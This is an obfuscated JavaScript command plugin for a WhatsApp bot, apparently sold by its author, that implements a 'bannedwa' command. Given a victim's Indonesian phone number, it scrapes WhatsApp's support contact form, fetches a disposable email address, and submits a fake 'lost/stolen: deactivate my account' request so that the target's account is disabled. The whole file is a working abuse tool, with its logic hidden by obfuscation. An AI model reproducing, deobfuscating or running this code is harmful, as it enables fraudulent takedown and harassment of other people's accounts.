/*
  * DannTeam
  * ig: @jkt48.danzz
  * Beli no encrypt? chat: 083137550315
*/

const _0x5943b0=_0x3652;(function(_0x295ac1,_0x2c2235){const _0x1a70e3=_0x3652,_0x22310a=_0x295ac1();while(!![]){try{const _0xf6fe8=parseInt(_0x1a70e3(0x129))/0x1*(-parseInt(_0x1a70e3(0x13b))/0x2)+parseInt(_0x1a70e3(0x13c))/0x3*(parseInt(_0x1a70e3(0xfe))/0x4)+parseInt(_0x1a70e3(0x117))/0x5*(-parseInt(_0x1a70e3(0x12d))/0x6)+-parseInt(_0x1a70e3(0x121))/0x7+-parseInt(_0x1a70e3(0x12c))/0x8+parseInt(_0x1a70e3(0x113))/0x9+-parseInt(_0x1a70e3(0x114))/0xa*(-parseInt(_0x1a70e3(0x127))/0xb);if(_0xf6fe8===_0x2c2235)break;else _0x22310a['push'](_0x22310a['shift']());}catch(_0x5c3a7e){_0x22310a['push'](_0x22310a['shift']());}}}(_0xfeb7,0xd626b));let axios=require(_0x5943b0(0x11e)),cheerio=require(_0x5943b0(0x13a)),PhoneNumber=require(_0x5943b0(0x122)),handler=async(_0x1d30d9,{conn:_0x507489,text:_0x259472})=>{const _0x534c49=_0x5943b0;if(!_0x259472)return _0x1d30d9[_0x534c49(0xfd)](_0x534c49(0x105));_0x259472=_0x259472['replace'](/[^0-9]/g,'');if(!(_0x259472[_0x534c49(0x12e)]('08')||_0x259472[_0x534c49(0x12e)]('62')))return _0x1d30d9[_0x534c49(0xfd)](_0x534c49(0x116));_0x259472=_0x259472[_0x534c49(0x12e)]('08')?_0x259472[_0x534c49(0x10c)]('08','62'):_0x259472;if(_0x259472+_0x534c49(0x119)===_0x507489[_0x534c49(0x10b)][_0x534c49(0x12b)])return _0x1d30d9[_0x534c49(0xfd)]('Is\x20that\x20bot\x20number\x20?');const _0x4b6ebc=await _0x507489[_0x534c49(0x108)](_0x259472+_0x534c49(0x119));if(_0x4b6ebc['length']==0x0)return _0x1d30d9[_0x534c49(0xfd)](_0x534c49(0x11f));_0x259472=_0x259472[_0x534c49(0x132)]();try{const _0x20bbcc=await axios[_0x534c49(0x111)]('https://www.whatsapp.com/contact/noclient/'),_0x1b20b7=await axios[_0x534c49(0x111)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10'),_0xc87d47=_0x20bbcc['headers'][_0x534c49(0x139)]||'',_0xd3af35=cheerio[_0x534c49(0x124)](_0x20bbcc[_0x534c49(0x10f)]),_0x15007b=_0xd3af35('form'),_0x1d1aa3=new URL(_0x15007b[_0x534c49(0x103)](_0x534c49(0x10d)),'https://www.whatsapp.com')[_0x534c49(0x115)];let _0x2bbb60=new URLSearchParams();_0x2bbb60['append']('jazoest',_0x15007b['find'](_0x534c49(0x12f))['val']()),_0x2bbb60[_0x534c49(0x11c)]('lsd',_0x15007b[_0x534c49(0x10e)](_0x534c49(0x106))['val']()),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x11b),'submit'),_0x2bbb60[_0x534c49(0x11c)]('country_selector','INDONESIA'),_0x259472=PhoneNumber('+'+_0x259472)[_0x534c49(0x101)](_0x534c49(0x12a)),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x136),''+_0x259472),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x130),_0x1b20b7[_0x534c49(0x10f)][0x0]),_0x2bbb60['append'](_0x534c49(0x109),_0x1b20b7[_0x534c49(0x10f)][0x0]),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x100),'ANDROID'),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0xff),_0x534c49(0x133)),_0x2bbb60['append'](_0x534c49(0xfb),'0'),_0x2bbb60['append']('__a','1'),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x123),''),_0x2bbb60['append']('__req','8'),_0x2bbb60['append'](_0x534c49(0x118),_0x534c49(0xfa)),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x112),'1'),_0x2bbb60['append'](_0x534c49(0x102),_0x534c49(0x128)),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x134),_0x534c49(0x120)),_0x2bbb60[_0x534c49(0x11c)](_0x534c49(0x10a),'0');const _0x15222b=await axios({'url':_0x1d1aa3,'method':_0x534c49(0x131),'data':_0x2bbb60,'headers':{'cookie':_0xc87d47}}),_0x83c61f=String(_0x15222b[_0x534c49(0x10f)]);if(_0x83c61f[_0x534c49(0x135)]('\x22payload\x22:true'))_0x1d30d9['reply'](_0x534c49(0x125)['trim']());else{if(_0x83c61f['includes'](_0x534c49(0x11d)))_0x1d30d9['reply']('Terima\x20kasih\x20telah\x20menghubungi\x20kami.\x0aKami\x20akan\x20menghubungi\x20Anda\x20kembali\x20melalui\x20email,\x20dan\x20itu\x20mungkin\x20memerlukan\x20waktu\x20hingga\x20tiga\x20hari\x20kerja.'[_0x534c49(0x132)]());else _0x1d30d9[_0x534c49(0xfd)](await import(_0x534c49(0x11a))[_0x534c49(0x138)](_0x15222b[_0x534c49(0x10f)]));}}catch(_0x17919a){_0x1d30d9[_0x534c49(0xfd)](''+_0x17919a);}};function _0x3652(_0x3cd6ac,_0x4513e9){const _0xfeb75b=_0xfeb7();return _0x3652=function(_0x36526,_0x1062a0){_0x36526=_0x36526-0xfa;let _0x4e33d0=_0xfeb75b[_0x36526];return _0x4e33d0;},_0x3652(_0x3cd6ac,_0x4513e9);}function _0xfeb7(){const _0xc3a85f=['startsWith','input[name=jazoest]','email','POST','trim','Perdido/roubado:\x20desative\x20minha\x20conta','__rev','includes','phone_number','owner','format','set-cookie','cheerio','1304HGxQdx','3MGTfhO','19316.BP:whatsapp_www_pkg.2.0.0.0.0','__user','premium','reply','5915928bfvoGo','your_message','platform','getNumber','__ccg','attr','tags','Nomornya\x20Mana?','input[name=lsd]','exports','onWhatsApp','email_confirm','__comment_req','user','replace','action','find','data','command','get','dpr','13151502jzyNYy','65380rAEZGq','href','Only\x20INDONESIA\x20number!','7687310sKflnO','__hs','@s.whatsapp.net','utils','step','append','\x22payload\x22:false','axios','Number\x20not\x20in\x20whatsapp!','1006630858','11931850chdisC','awesome-phonenumber','__csr','load','WhatsApp\x20Support\x0aHai,\x0aTerima\x20kasih\x20atas\x20pesan\x20Anda.\x0aKami\x20telah\x20menonaktifkan\x20akun\x20WhatsApp\x20Anda.','bannedwa','4092HVkkBZ','UNKNOWN','811zGdSbl','international','jid','5795592lTpOOn','6NyRzjM'];_0xfeb7=function(){return _0xc3a85f;};return _0xfeb7();}handler['help']=[_0x5943b0(0x126)],handler[_0x5943b0(0x110)]=/^(bannedwa)$/i,handler['owner']=!![],handler[_0x5943b0(0xfc)]=!![],module[_0x5943b0(0x107)]=handler;